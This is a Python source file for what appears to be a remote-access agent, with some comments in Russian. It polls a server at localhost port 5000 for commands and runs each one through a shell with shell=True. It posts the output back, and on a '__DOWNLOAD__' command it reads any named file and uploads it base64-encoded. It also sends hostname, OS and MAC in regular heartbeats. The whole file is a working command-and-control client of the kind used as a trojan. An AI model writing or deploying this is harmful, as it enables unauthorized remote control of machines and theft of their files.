import subprocess
import requests
import socket
import platform
import uuid
import time
import ctypes
import os, base64

try:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
except:
    is_admin = False

if not is_admin:
    print("[!] It is recommended to run this agent as Administrator, otherwise some commands may not work.")

SERVER_URL = "http://127.0.0.1:5000/api/heartbeat"
AGENT_ID = str(uuid.uuid4())  # уникальный ID при каждом запуске

def get_mac():
    mac = uuid.getnode()
    return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))

while True:
    payload = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "mac": get_mac()
    }

    try:
        cmd_resp = requests.get(f"http://127.0.0.1:5000/api/agent/{AGENT_ID}/get_command", timeout=5)
        if cmd_resp.status_code == 200:
            json_data = cmd_resp.json()
            command = json_data.get("command")
            if command:
                print(f"[{time.ctime()}] Executing command: {command}")

                # --- Обработка команды загрузки файла ---
                if command.startswith("__DOWNLOAD__:"):
                    filepath = command.split(":", 1)[1].strip().strip('"')
                    try:
                        with open(filepath, "rb") as f:
                            data_b64 = base64.b64encode(f.read()).decode("ascii")
                        filename = os.path.basename(filepath)
                        requests.post(
                            f"http://127.0.0.1:5000/api/agent/{AGENT_ID}/file",
                            json={"name": filename, "data": data_b64},
                            timeout=10
                        )
                        requests.post(
                            f"http://127.0.0.1:5000/api/agent/{AGENT_ID}/output",
                            json={"output": f"File '{filename}' sent to server."}
                        )
                    except Exception as e:
                        requests.post(
                            f"http://127.0.0.1:5000/api/agent/{AGENT_ID}/output",
                            json={"output": f"Download failed: {e}"}
                        )
                else:

                    if os.name == "nt":
                        command = f'chcp 65001>nul & {command}'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout or result.stderr or "No output"
                    print(output)
                    try:
                        requests.post(f"http://127.0.0.1:5000/api/agent/{AGENT_ID}/output", json={"output": output})
                    except Exception as e:
                        print(f"[{time.ctime()}] Failed to send output: {e}")

            else:
                print(f"[{time.ctime()}] No command received.")
        else:
            print(f"[{time.ctime()}] Server returned status {cmd_resp.status_code} for get_command.")
    except Exception as e:
        print(f"[{time.ctime()}] Command error: {e}")

    # Отправка heartbeat
    try:
        response = requests.post(SERVER_URL, json=payload, timeout=5)
        print(f"[{time.ctime()}] Sent heartbeat: {response.status_code}")
    except Exception as e:
        print(f"[{time.ctime()}] Heartbeat error: {e}")

    time.sleep(10)